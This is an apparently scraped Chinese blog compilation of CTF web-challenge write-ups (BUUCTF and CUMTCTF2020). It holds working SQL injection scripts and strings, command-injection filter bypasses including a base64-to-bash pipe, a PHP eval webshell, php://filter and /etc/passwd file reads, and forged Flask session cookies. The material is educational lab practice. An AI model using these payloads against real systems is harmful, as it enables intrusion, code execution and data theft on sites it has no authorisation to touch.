1cat&#x3D;dog [极客大挑战 2019]BuyFlag主要说一下两个函数 strcmp() strcmp()函数只有在相等的情况下返回0。那么我们传入一个数组，它会返回NULL，而判断使用了== ，而NULL==0是bool(true)，这样就成功绕过。 is_numeric() is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入 之后就是改cookie，post进password和money 这里判断money相等用的是strcmp()所以我们可以用数组绕过 [BJDCTF2020]Easy MD5（ffifdyop）发了几个数字后没发现什么东西，然后抓包，看见hint 1select * from &#39;admin&#39; where password&#x3D;md5($pass,true) 这里想要绕过的话肯定是找万能密码 1password&#x3D;&#39;&#39; or &#39;123&#39; 这里的话用的是ffifdyopMD5加密后为 1&#39;or&#39;6É]™é!r,ùíb\u001c 符合万能密码 进入下一关 源码如下 12345$a &#x3D; $GET[&#39;a&#39;];$b &#x3D; $_GET[&#39;b&#39;];if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123; &#x2F;&#x2F; wow, glzjin wants a girl friend. 这个可以拿数组过，也可以找一些特殊的如 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 他们的MD5都是0 最后一关源码 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123; echo $flag;&#125; 直接拿数组绕过就好 开发[护网杯 2018]easy_tornado学习一下tornado https://blog.csdn.net/belalds/article/details/80575755 1234567891011121314151617# coding:utf-8 import tornado.webimport tornado.ioloop class IndexHandler(tornado.web.RequestHandler): \"\"\"主路由处理类\"\"\" def get(self): \"\"\"对应http的get请求方式\"\"\" self.write(\"Hello Itcast!\") if __name__ == \"__main__\": app = tornado.web.Application([ (r\"/\", IndexHandler), ]) app.listen(8000) tornado.ioloop.IOLoop.current().start() tornado.web tornado的基础web框架模块 RequestHandler 封装了对应一个请求的所有信息和方法，write(响应信息)就是写响应信息的一个方法；对应每一种http请求方式（get、post等），把对应的处理逻辑写进同名的成员方法中（如对应get请求方式，就将对应的处理逻辑写在get()方法中），当没有对应请求方式的成员方法时，会返回“405: Method Not Allowed”错误。 1234567891011121314151617# coding:utf-8 import tornado.webimport tornado.ioloop class IndexHandler(tornado.web.RequestHandler): \"\"\"主路由处理类\"\"\" def post(self): # 我们修改了这里 \"\"\"对应http的post请求方式\"\"\" self.write(\"Hello Itcast!\") if __name__ == \"__main__\": app = tornado.web.Application([ (r\"/\", IndexHandler), ]) app.listen(8000) tornado.ioloop.IOLoop.current().start() Application Tornado Web框架的核心应用类，是与服务器对接的接口，里面保存了路由信息表，其初始化接收的第一个参数就是一个路由信息映射元组的列表；其listen(端口)方法用来创建一个http服务器实例，并绑定到给定端口（注意：此时服务器并未开启监听）。 总结Tornado Web程序编写思路 创建web应用实例对象，第一个初始化参数为路由映射列表。 定义实现路由映射列表中的handler类。 创建服务器实例，绑定服务器端口。 启动当前线程的IOLoop。 [HCTF 2018]admin（flask中session伪造）发现只能admin才能登录获取flag 主要学习一下flask中的session伪造 session一般存储在服务器，而在flask中，session是存储在客户端，并且flask中对数据仅仅进行了签名，签名主要目的是防止篡改，但却无法防止被读取。所以就会产生一些安全问题。 在这个题中，我们就可以根据这个来解题 先来看一下自己注册用户test的cookie，之后进行解码，可以参考p牛的脚本，也可以上github上找flask-session-manager之后done下来 我这里用的是python2.7 解密:python flask_session_manager2.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY 加密:python flask_session_manager2.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式 12.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125; 1.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs 之后进行改密码登录就可以。 文件包含[极客大挑战 2019]Secret一直查看源码最后只需要用一个文件包含就可以读出flag 12?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php [ACTF2020 新生赛]Include直接读取flag.php 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php PHP反序列化[极客大挑战 2019]PHP（简单反序列化）考察php反序列化，先下载www.zip里面有三个文件，其中有class.php，index.php，flag.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123; private $username &#x3D; &#39;nonono&#39;; private $password &#x3D; &#39;yesyes&#39;; public function __construct($username,$password)&#123; $this-&gt;username &#x3D; $username; $this-&gt;password &#x3D; $password; &#125; function __wakeup()&#123; $this-&gt;username &#x3D; &#39;guest&#39;; &#125; function __destruct()&#123; if ($this-&gt;password !&#x3D; 100) &#123; echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;; die(); &#125; if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 其中逻辑就是密码为100，并且username=’admin‘ 12345678class Name&#123; private $username = \"admin\"; private $password = \"100\";&#125;$a = new Name();$a = serialize($a); echo urlencode($a);//O:4:\"Name\":3:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";s:3:\"100\";&#125; 最后进行url编码就行。 [ZJCTF 2019]NiZhuanSiWei看源码 12345678910111213141516171819&lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123; echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; //text的内容为welcome to the zjctf if(preg_match(\"/flag/\",$file))&#123; echo \"Not now!\"; //file的内容不能包含flag exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); //反序列化 echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 看源码知道共有三个参数，所以依次判断 text的内容为welcome to the zjctf，所以我们可以用data协议 12text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctftext&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D; 之后是file，题中已经提示了useless.php，说明我们首先得拿出源码，之后包含这个文件 1file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php 拿出源码 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); &#125; &#125; &#125; ?&gt; 之后就是password，很明显是序列化 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 1http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 查看源码就有flag [网鼎杯 2018]Fakebook（报错注入和反序列化）首先发现信息泄露 1&#x2F;user.php.bak 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass UserInfo&#123; public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; //创建一个curl资源 $ch = curl_init(); //设置url和相应的选项 curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //抓取url并传递给浏览器 $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; //关闭curl资源，并且释放系统资源 curl_close($ch); //唯一的参数是curl_init()函数返回的句柄 return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); &#125;&#125; 找了好长时间，找不到注入点 后来发现，登录之后，可以查看一些信息 并且很重要的是view.php中no是可以注入的 12345678910111213141516171819import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"\"flag = ''for i in range(1,50): for j in range(32,128): payload = \"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\".format(i,j); r = requests.get(url=payload) if \"Fatal\" not in r.text: print(payload) flag += str(chr(j)) break print(flag)payload = \"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\".format(i,j);#userspayload = 'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),&#123;&#125;,1))=&#123;&#125;,2,3)'.format(i,j);#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONSpayload = 'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'.format(i,j);#O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:11;s:4:\"blog\";s:8:\"pz1o.top\";&#125; 其实也可以报错注入，但当时以为0x7e被ban了之后就不能报错了，tcl 12345671%20and%20extractvalue(1,concat(%27$%27,(select(group_concat(database()))))%23fakebook1%20and%20extractvalue(1,concat(%27$%27,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())))%23users1%20and%20extractvalue(1,concat(%27$%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%23no,username,passwd,data,USER,CU1%20and extractvalue(%27$%27,concat(%27$%27,(select data%20from%20users)))%23 做到这其实就不会做了。。。看大师傅的wp才知道可以no参数注入反序列化 其中payload为 10%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23 至于为什么会想到这个，首先data中就是反序列化的字符串，并且，最后一个blog内容会被显示出来，这样就希望从blog中获得flag 命令执行[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）直接ping命令执行 用分号执行两个命令 1?ip&#x3D;8.8.8.8;ls 查看有flag.php，重要的就是怎么去读取flag.php 这里发现过滤了空格，所以绕过空格的办法，简单来说有两种，第一种是${IFS} ```root@kali:~# cat flagthis is your flagroot@kali:~# cat${IFS}flagthis is your flag 122. root@kali:~# cat${IFS}$1flagthis is your flag 123. root@kali:~# cat$IFS$1flagthis is your flag 1234第二种呢是重定向符1. root@kali:~# cat&lt;&gt;flagthis is your flag 122. root@kali:~# cat&lt;flagthis is your flag 12345678这里呢我们选用$&#123;IFS&#125;来绕过，之后又发现&#123;&#125;被过滤，所以用第三个方式![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)这时，我们发现flag也被过滤了，所以**黑名单绕过又有几种方式**1. 拼接 root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$dthis is your flag 122. base64编码 root@kali:~# echo &quot;Y2F0IGZsYWc=&quot;|base64 -dthis is your flag root@kali:~# echo “Y2F0IGZsYWc=”|base64 -d|bashthis is your flag 123. 单引号、双引号 root@kali:~# c””at fl’’agthis is your flag 124. 反斜线 root@kali:~# c\\at fl\\agthis is your flag 12这里直接拼接过去就好 ?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263即可拿到flag**主要是绕过空格和绕过黑名单**## [RoarCTF 2019]Easy Calc（php字符串解析）打开源码，发现calc.php ，然后访问calc.php![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)num变量过滤了一些东西，但我们用一些函数去访问时，会发现403拒绝访问，说明有waf通过网上查找，是**php的字符串解析特性**&gt; PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：&gt;&gt; 1.删除空白符 &gt;&gt; 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】先试一试phpinfo();可以用说明我们就成功了。接下来，就是读取目录，找flag了，从phpinfo中我们可以看见一些外部函数被ban了这时就需要介绍以下几个函数1. **scandir() 函数**: 返回指定目录中的文件和目录的数组。2. **base_convert(number,formbase,tobase) 函数**: 在任意进制之间转换数字。3. **dechex() 函数**： 把十进制转换为十六进制。4. **hex2bin() 函数**： 把十六进制值的字符串转换为 ASCII 字符。5. **readfile() 函数**: 输出一个文件。6. **chr()函数** 十进制返回ascii字符7. **ord()函数** ascii字符转换为十进制8. **file_get_contents()** 把文件读入一个字符串中通常会用hex2bin(dechex(47))一起使用，这个表示&#x2F;这里&#x2F;被过滤了所以payload可以为 ? num=var_dump(scandir(chr(47)))? num=var_dump(scandir(hex2bin(dechex(47)))) 12发现flag直接readfile读取即可 ? num=var_dump(readfile(chr(47).f1agg))? num=file_get_contents(chr(47).f1agg) 12还有其他的payload ? num=base_convert(55490343972,10,36)() 1234## [ACTF2020 新生赛]Exec直接查就可以 8.8.8.8;ls /8.8.8.8;cat /flag 1234## [极客大挑战 2019]Http改请求包xff，ua，ref。 GET /Secret.php HTTP/1.1Host: node3.buuoj.cn:28918User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 SycloverAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0referer: https://www.Sycsecret.comX-Forwarded-for: 127.0.0.1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 文件上传## [SUCTF 2019]CheckIn（.user.ini）&#96;&#96;&#96;php&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt; &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#x2F;&#x2F; error_reporting(0);$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;这个是初始目录if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true); &#x2F;&#x2F;如果不存在，就将创建目录可写可执行&#125;file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);if (isset($_POST[&quot;upload&quot;])) &#123; $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;]; $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;]; if (!$tmp_name) &#123; &#x2F;&#x2F;判断是否存在上传文件 die(&quot;filesize too big!&quot;); &#125; if (!$name) &#123; &#x2F;&#x2F;文件名不许为空 die(&quot;filename cannot be empty!&quot;); &#125; $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;截取后缀名 if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123; die(&quot;illegal suffix!&quot;); &#x2F;&#x2F;正则匹配，ph和htaccess都不可以 &#125; if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123; die(&quot;&lt;? in contents!&quot;); &#x2F;&#x2F;文件内容不许有&lt;? &#125; $image_type &#x3D; exif_imagetype($tmp_name); &#x2F;&#x2F;判断一个图像的类型 if (!$image_type) &#123; die(&quot;exif_imagetype:not image!&quot;); &#125; $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;; echo &#39;Your files : &lt;br&gt;&#39;; var_dump(scandir($userdir));&#125; 源码如上，可以学习一下 其中exif_imagetype()可以记录一下 但我们可以通过给上传脚本加上相应的幻数头字节就可以绕过： JPG ：FF D8 FF E0 00 10 4A 46 49 46 GIF(相当于文本的GIF89a)：47 49 46 38 39 61 PNG： 89 50 4E 47 这里想要上传成功，要借助一下.user.ini https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html .user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置） 其中有两个配置，可以用来制造后门：auto_append_file、auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： 1&gt;auto_prepend_file&#x3D;test.jpg 那么当我们访问此目录下的任何一个文件时，都会去包含test.jpg 常见姿势： 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 这里最后就要写一个图片马了 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt; 然后把两个上传，连菜刀就可以拿到flag了 主要来学习一下文件上传的操作 [极客大挑战 2019]Upload这个直接上传就可以，改一下文件内容的头，然后改下文件名phtml 菜刀连接拿flag [ACTF2020 新生赛]BackupFile备份文件index.php.bak 两个等号弱等于，直接123拿flag [ACTF2020 新生赛]Upload上传改名字，拿flag [极客大挑战 2019]Knife直接菜刀连接，根目录下有flag","categories":[{"name":"BUU","slug":"BUU","permalink":"https://pz1o.top/categories/BUU/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"刷题","slug":"刷题","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"CUMTCTF2020","slug":"CUMTCTF2020","date":"2020-09-25T11:00:00.000Z","updated":"2020-11-20T14:18:32.426Z","comments":true,"path":"2020/09/25/CUMTCTF2020/","link":"","permalink":"https://pz1o.top/2020/09/25/CUMTCTF2020/","excerpt":"","text":"CUMTCTF2020第一次打比赛，大三的师傅们好强 webWeb签到 get传入参数1，post传入参数2，然后文件包含flag.php，查看源码拿flag 1#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125; Babysqli过滤空格的sql注入，可以用/**/绕过,用union注入 payload 123456789#查表1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8##emails,users1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8##id,email_id1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8##user_id,first_name,last_name,user,password,avatar,last_login,failed_login1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8##CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125; Secret1view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg 直接看图片的源代码，发现后面有php 1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);include_once('flag.php');if(isset($_GET['param1']))&#123; $str1=$_GET['param1']; if(file_get_contents($str1)!=='Suvin_wants_a_girlfriend') die(\"Suvin doesn't like you\"); if(isset($_GET['param2']))&#123; $str2=$_GET['param2']; if(!is_numeric($str2)) die('Suvin prefers strings of Numbers'); else if($str2&lt;3600*24*30) die('Suvin says the num is too short'); else if($str2&gt;3600*24*31) die('Suvin says the num is too long'); else &#123; echo \"Suvin says he's falling in love with you!\".\"&lt;/br&gt;\"; sleep(intval($str2)); &#125; if (isset($_POST['param1']) &amp;&amp; isset($_POST['param2'])) &#123; $str1=$_POST['param1']; $str2=$_POST['param2']; if(strlen($str1)&gt;1000) die(\"It's too long\"); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(\"It's so similar to md5\"); &#125; &#125;&#125; 首先get传入param1要和一个字符串相等可以用data:// get传入param2要判断这个参数是否是数字并且要限制了范围，在加上有sleep，很自然的就想到了科学计数法 因此payload 1http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend 接下来是post的两个参数要的是字符串下的参数1和参数2不强等，但sha1加密强等，这里就不能用zhe数组绕过了 这里找两个sha1加密的不一样的字符串,找的是那个pdf，然后提取前面的内容即可，最后抓包改参数1和参数2拿flag Babysqli2过滤了单引号和字符串截断函数substr()和mid()并且无回显，因为有正确和错误登录界面那应该就是盲注了 这里用left来截取字符串，并且用十六进制来替换单引号及其里面的内容 直接放脚本 1234567891011121314151617181920212223242526272829import binasciiimport requests#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'dict='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = 'http://202.119.201.197:13004/index.php'flag = ''j = ''for i in range(1,400): for a in dict: #payload = \"or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a)) #payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j+a)) #payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j + a)) payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a)) #print(payload) #cumtctf #emails users #id id username,password data = &#123; 'username' : \"100\\\\\", 'password' : payload &#125; r = requests.session() res = r.post(url=url,data=data) #print(res.content) if 'Wrong username' not in res.content: j += a flag +=a break print(flag) 好像是在最后，多跑一会就出来了 Try:GET_file先扫目录发现有phpinfo.php 包含一下发现有文件包含漏洞 之后又包含敏感文件 1?file&#x3D;&#x2F;etc&#x2F;passwd 这里有一个phpinfo上传文件再包含 1234567891011121314151617在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是&#x2F;tmp&#x2F;php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除6）我们可以利用这个时间差，成功包含临时文件，最后getshell 这里有现成的exp 